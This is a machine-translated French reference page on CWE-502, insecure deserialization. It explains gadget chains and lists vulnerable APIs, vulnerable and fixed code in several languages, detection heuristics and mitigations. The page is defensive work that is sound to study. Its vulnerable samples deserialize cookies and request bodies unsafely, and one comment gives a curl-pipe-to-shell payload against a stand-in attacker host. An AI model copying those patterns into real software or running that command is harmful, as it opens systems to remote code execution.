---
description: "CWE-502 : la désérialisation de données contrôlées par un attaquant permet l'exécution de code arbitraire via des chaînes de gadgets. Cause racine : l'instanciation d'objets lors de la désérialisation invoque des constructeurs et des chaînes de méthodes."
date: 2026-04-16
tags: [security, cwe, deserialization, rce, java, python, php, dotnet, ruby, nodejs]
level: Advanced
source_sha256: 92e20c63effc9e02b9f9c40c27855017d9d48e05c66d549367a828ada6bf8c79
translation: machine
translated_at: '2026-10-24'
---
# CWE-502 : Désérialisation de données non fiables {#cwe-502-deserialization-of-untrusted-data}

**CWE-502** | OWASP Top 10 A08:2021 | Plage de score de base CVSS : 8.1-9.8 | Rang 16 dans le Top 25 CWE

## Sémantique fonctionnelle {#functional-semantics}

La désérialisation reconstruit un graphe d'objets à partir d'un flux d'octets. La vulnérabilité provient du fait que le désérialiseur doit instancier des objets et invoquer des méthodes (readObject, __wakeup, __destruct, setters de propriétés) **avant** que le code applicatif puisse inspecter le résultat. Les données fournies par l'attaquant contrôlent les classes instanciées et leur état, ce qui permet de parcourir des « chaînes de gadgets » préexistantes, c'est-à-dire des séquences de méthodes légitimes de classes qui, enchaînées, produisent l'exécution de commandes arbitraires sur le système d'exploitation.

L'attaquant n'injecte pas de nouveau code : il compose du code existant de manière inattendue. L'exploitation requiert seulement qu'une chaîne de gadgets existe parmi les classes chargées (classpath JVM, arbre d'imports Python, etc.), et non dans le code propre à l'application.

## Cause racine {#root-cause}

Les formats de désérialisation qui encodent les informations de type à côté des données permettent au désérialiseur d'instancier des classes arbitraires de l'univers de classes du runtime. La frontière de sécurité supposée par l'application (seuls les types de données attendus arrivent) est absente au niveau du protocole. Les correctifs au niveau de la validation des données arrivent systématiquement trop tard, car la construction des objets a déjà eu lieu.

## Conditions de déclenchement {#trigger-conditions}

- Le désérialiseur reçoit des données provenant de : corps ou cookie HTTP, trame WebSocket, file de messages, paramètre RPC, téléversement de fichier, lecture d'un BLOB de base de données depuis une table accessible en écriture par l'utilisateur, couche de cache (Redis/Memcached) alimentée par une saisie utilisateur.
- Le format de sérialisation transporte des métadonnées de type : sérialisation native Java (`AC ED 00 05`), pickle Python (opcodes `\x80\x04`), chaînes `O:` / `a:` de PHP, BinaryFormatter .NET, Marshal Ruby (`\x04\x08`), YAML avec des balises `!!`, AMF, Kryo avec enregistrement par défaut.
- Des bibliothèques de chaînes de gadgets sont présentes dans le classpath : `commons-collections`, `spring-core`, `groovy`, `xstream`, bibliothèques couvertes par `ysoserial`.

## Écosystèmes concernés {#affected-ecosystems}

| Plateforme | API vulnérable | Alternative sûre |
|---|---|---|
| Java | `ObjectInputStream.readObject()` | JSON (Jackson avec restrictions de types), liste d'autorisation via `readResolve` |
| Python | `pickle.loads()`, `yaml.load()`, `shelve` | `json`, `yaml.safe_load()`, `ast.literal_eval()` |
| PHP | `unserialize()` | `json_decode()`, paramètre `allowed_classes` |
| .NET | `BinaryFormatter`, `NetDataContractSerializer`, `SoapFormatter` | `System.Text.Json`, `DataContractSerializer` avec `DataContractResolver` |
| Ruby | `Marshal.load()` | JSON, MessagePack |
| Node.js | `node-serialize` (npm), chemin eval de `serialize-javascript` | JSON simple |
| XML/YAML | `XStream.fromXML()`, `yaml.load()` avec `!!python/object` | Parseurs validés par schéma, loaders sûrs |

## Patrons vulnérables {#vulnerable-patterns}

### Java : ObjectInputStream sans liste d'autorisation {#java-objectinputstream-without-allowlist}

```java
// VULNERABLE: deserializes arbitrary classes from HTTP body
@PostMapping("/api/prefs")
public ResponseEntity<?> loadPrefs(@RequestBody byte[] data) {
    try (ObjectInputStream ois = new ObjectInputStream(
            new ByteArrayInputStream(data))) {
        UserPrefs prefs = (UserPrefs) ois.readObject(); // gadget chain executes here
        return ResponseEntity.ok(prefs);
    }
}
```

### Python : pickle sur une entrée non fiable {#python-pickle-on-untrusted-input}

```python
# VULNERABLE: pickle.loads executes arbitrary opcodes
import pickle, base64
from flask import request

@app.route("/restore")
def restore_session():
    data = base64.b64decode(request.cookies.get("session"))
    obj = pickle.loads(data)  # attacker payload: os.system("curl attacker.com/shell.sh|sh")
    return str(obj)
```

### PHP : unserialize sans restriction de classes {#php-unserialize-without-class-restriction}

```php
// VULNERABLE: triggers __wakeup/__destruct on arbitrary classes
$data = base64_decode($_COOKIE['cart']);
$cart = unserialize($data); // POP chain via Symfony/Laravel gadgets
```

## Patrons corrigés {#fixed-patterns}

### Java : ObjectInputStream avec liste d'autorisation de classes {#java-objectinputstream-with-class-allowlist}

```java
// FIXED: allowlist via serialization filter (Java 9+)
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
ois.setObjectInputFilter(info -> {
    Class<?> cls = info.serialClass();
    if (cls == null) return ObjectInputFilter.Status.ALLOWED;
    if (cls == UserPrefs.class || cls == String.class) {
        return ObjectInputFilter.Status.ALLOWED;
    }
    return ObjectInputFilter.Status.REJECTED; // block gadget chains
});
UserPrefs prefs = (UserPrefs) ois.readObject();
```

### Python : suppression de pickle, utilisation de JSON {#python-eliminate-pickle-use-json}

```python
# FIXED: JSON cannot instantiate arbitrary objects
import json, base64
from flask import request

@app.route("/restore")
def restore_session():
    raw = base64.b64decode(request.cookies.get("session"))
    data = json.loads(raw)  # pure data, no code execution
    prefs = UserPrefs(theme=data["theme"], lang=data["lang"])
    return str(prefs)
```

### PHP : restriction via allowed_classes {#php-allowed_classes-restriction}

```php
// FIXED: restricts instantiation to known safe classes
$data = base64_decode($_COOKIE['cart']);
$cart = unserialize($data, ["allowed_classes" => ["CartItem", "ProductRef"]]);
// Returns false if unknown class encountered
if ($cart === false) { /* reject */ }
```

### .NET : remplacement de BinaryFormatter {#net-replace-binaryformatter}

```csharp
// VULNERABLE
var formatter = new BinaryFormatter();
var obj = formatter.Deserialize(stream); // CS0618 warning in .NET 5+, removed .NET 9

// FIXED: System.Text.Json with strict type handling
var options = new JsonSerializerOptions { PropertyNameCaseInsensitive = true };
var obj = JsonSerializer.Deserialize<UserPrefs>(stream, options);
```

## Heuristiques de détection {#detection-heuristics}

**Déclencheurs d'analyse statique :**
- `ObjectInputStream`, `readObject`, `readUnshared` sur un `InputStream` non constant
- `pickle.loads`, `pickle.load` dont l'argument n'est pas un fichier ouvert par l'application
- `yaml.load(` sans argument `Loader=yaml.SafeLoader`
- `unserialize(` en PHP sans `allowed_classes`
- Utilisation de `BinaryFormatter`, `SoapFormatter`, `NetDataContractSerializer` (tous obsolètes)
- `Marshal.load` en Ruby sur toute entrée non codée en dur
- `eval(` dans le chemin de désérialisation de node-serialize

**Déclencheurs de flux de données :**
- Les données sérialisées proviennent de : `request.body`, `request.cookies`, `request.headers`, paramètre de requête, téléversement de fichier, lecture d'une file de messages
- Octets magiques dans les données contrôlées : `AC ED 00 05` (Java), `\x80\x04` ou `\x80\x05` (pickle Python v4/v5), préfixe `O:` (PHP), `\x04\x08` (Ruby Marshal)

**Déclencheurs liés aux dépendances (présence de chaînes de gadgets) :**
- Maven/Gradle : `commons-collections < 3.2.2`, `commons-beanutils < 1.9.4`, `spring-core`, `groovy-all`
- npm : `node-serialize` (toute version, intrinsèquement non sûre)
- pip : `PyYAML < 6.0` avec `yaml.load` sans Loader

**Indicateurs de faux positifs :**
- `ObjectInputStream` lisant depuis un fichier que l'application a elle-même écrit pendant le même cycle de requête (contenu non contrôlé par l'utilisateur).
- `pickle.loads` dans des fixtures de tests unitaires chargeant des données de test connues et versionnées.
- Données sérialisées protégées par un HMAC vérifié **avant** la désérialisation : cela réduit le risque sans l'éliminer, notamment si le secret HMAC fuit.

## Pièges à éviter {#gotchas}

- **Les données sérialisées signées par HMAC ne sont pas sûres.** Si la clé de signature est compromise (variable d'environnement, valeur codée en dur, canal auxiliaire temporel), l'attaquant peut forger des signatures valides. Ne jamais sérialiser vers des formats transportant des métadonnées de type, quelle que soit la signature.
- **JSON n'est pas universellement sûr.** `json.loads` en Python est sûr ; `JSON.parse` en Node.js l'est aussi. Mais `JSON.parse` suivi de `eval(result.code)` ou de `new Function(result.fn)` réintroduit l'exécution de code. La vulnérabilité réside dans l'usage post-désérialisation, et non dans le parseur JSON lui-même.
- **Contournement de liste d'autorisation par héritage.** Un ObjectInputFilter Java autorisant `Collection` accepte `ArrayList`, `HashMap` et toute classe tierce implémentant `Collection`. Utiliser des vérifications de classes finales, et non `isAssignableFrom`.
- **Les chaînes de gadgets survivent aux mises à jour de classes.** Corriger `commons-collections` supprime les gadgets connus, mais de nouvelles chaînes sont régulièrement découvertes. Une liste d'autorisation est un contrôle plus robuste que les seules mises à jour de dépendances.
- **DataContractSerializer .NET est sûr sous conditions.** Avec un `DataContractResolver`, il peut instancier des types arbitraires si le resolver est permissif. Le comportement par défaut (sans resolver, uniquement les types connus explicitement) est sûr.
- **Redis/Memcached comme vecteur de désérialisation.** Les applications lisant des objets Java sérialisés depuis Redis sont vulnérables si un attaquant peut écrire dans la clé de cache (via SSRF vers Redis, ou empoisonnement de cache par des clés non validées).

## Impact de l'exploitation {#exploitation-impact}

- **RCE directe :** la chaîne de gadgets aboutit à `Runtime.exec()`, `ProcessBuilder`, `os.system()`, `eval()`
- **Écriture de fichiers :** la chaîne de gadgets écrit sur le système de fichiers, permettant la création d'un webshell
- **Pivot SSRF :** la chaîne de gadgets initie des requêtes HTTP sortantes vers des services internes
- **Élévation de privilèges :** désérialisation dans le contexte d'un service privilégié (par exemple, maître Jenkins, administration d'un serveur d'applications)

## Priorité d'atténuation {#mitigation-priority}

1. **Supprimer le format** : remplacer la sérialisation binaire ou sensible aux types par JSON/protobuf (sans métadonnées de type). Meilleur retour sur investissement.
2. **Lister les classes autorisées** : filtre de sérialisation Java, `allowed_classes` en PHP. Nécessaire lorsque le format ne peut pas être changé.
3. **Vérification d'intégrité avant désérialisation** : HMAC sur la charge utile, vérifié avant de la transmettre au désérialiseur.
4. **Isolation réseau** : si les chaînes de gadgets nécessitent un accès sortant (callback DNS, reverse shell), bloquer le trafic sortant du processus de désérialisation.
5. **Agents Java de blocage de désérialisation** : `SerialKiller`, `NotSoSerial`, `HardenedObjectInputStream` en défense en profondeur.

## Voir aussi {#see-also}

- CWE-020 : Validation des entrées : contrôle en amont, valider le format avant la désérialisation
- CWE-094 : Injection de code : impact recouvrant, exécution de code arbitraire
- [[cwe-918-ssrf]] : la chaîne de gadgets sert souvent à déclencher des requêtes HTTP internes
- CWE-611 : Entités externes XML : schéma similaire, le parseur instancie des ressources externes
